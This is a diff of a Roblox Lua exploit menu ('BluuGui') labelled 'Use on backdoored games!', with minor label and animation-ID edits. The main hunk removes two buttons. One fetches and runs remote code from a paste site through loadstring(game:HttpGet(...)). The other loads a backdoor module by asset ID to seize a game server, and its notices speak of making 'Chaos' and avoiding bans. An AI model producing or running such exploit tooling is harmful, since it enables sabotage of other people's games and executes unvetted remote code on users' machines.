@@ -5,7 +5,7 @@ local Window = Rayfield:CreateWindow({
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "Use on backdoored games!",
    LoadingSubtitle = "by 118o8",
-   ShowText = "BluuGui (Only FE)", -- for mobile users to unhide rayfield, change if you'd like
+   ShowText = "BluuGui (FE)", -- for mobile users to unhide rayfield, change if you'd like
    Theme = "Ocean", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
    ToggleUIKeybind = "B", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)
@@ -108,7 +108,7 @@ local Button = Server:CreateButton({
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- Replace this with the Animation ID for "Monster Smash Go"
-local animationId = "rbxassetid://YOUR_ANIMATION_ID"
+local animationId = "rbxassetid://35654637a"
 
 -- Function to play animation on a character
 local function playDance(character)
@@ -394,45 +394,6 @@ local Button = Server:CreateButton({
    Title = "LALOL scaner executed",
    Content = "Good Luck :3",
    Duration = 2.3,
-   Image = 4483362458,
-})
-   end,
-})
-
-local Button = Server:CreateButton({
-   Name = "Polaria Hub (Basic)",
-   Callback = function()
-  
-loadstring(game:HttpGet("https://www.fragbin.com/api/pastes/raw/4VAIWK"))()
-
-            Rayfield:Notify({
-   Title = "Polaria Hub executed",
-   Content = "Lets make some Chaos >:D",
-   Duration = 2.3,
-   Image = 4483362458,
-})
-   end,
-})
-
-local Button = Server:CreateButton({
-   Name = "Polaria Hub",
-   Callback = function()
-  
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
--- Automatically get your DisplayName
-local myDisplayName = player.DisplayName
-
--- Require the module and pass the DisplayName
-local myModule = require(123255432303221)
-myModule:Pload(myDisplayName)
-
-
-            Rayfield:Notify({
-   Title = "Polaria Hub executed",
-   Content = "Remember use LAOLOL after execute cuz u can get banned :P",
-   Duration = 5.0,
    Image = 4483362458,
 })
    end,
